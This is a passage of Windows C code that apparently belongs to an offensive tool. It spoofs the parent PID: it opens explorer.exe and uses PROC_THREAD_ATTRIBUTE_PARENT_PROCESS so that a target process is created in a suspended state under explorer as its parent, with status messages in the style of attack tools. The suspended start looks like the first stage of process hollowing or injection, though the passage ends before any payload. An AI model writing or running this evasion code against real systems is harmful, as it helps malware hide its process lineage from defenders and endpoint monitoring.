    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attrSize = 0;

    // ---- Parent PID spoofing ----
    DWORD explorerPid = GetExplorerPid();
    if (!explorerPid) {
        printf("[-] Could not find explorer.exe\n");
        return FALSE;
    }
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
    if (!hParent) {
        printf("[-] Failed to open explorer process\n");
        return FALSE;
    }

    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    if (!si.lpAttributeList) {
        CloseHandle(hParent);
        return FALSE;
    }
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    printf("[*] Creating target process: %s with parent PID %lu\n", g_TargetProcess, explorerPid);
    if (!CreateProcessA(g_TargetProcess, NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL, NULL, (LPSTARTUPINFOA)&si, &pi)) {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        return FALSE;
    }
    printf("[+] Process created (PID: %d)\n", pi.dwProcessId);
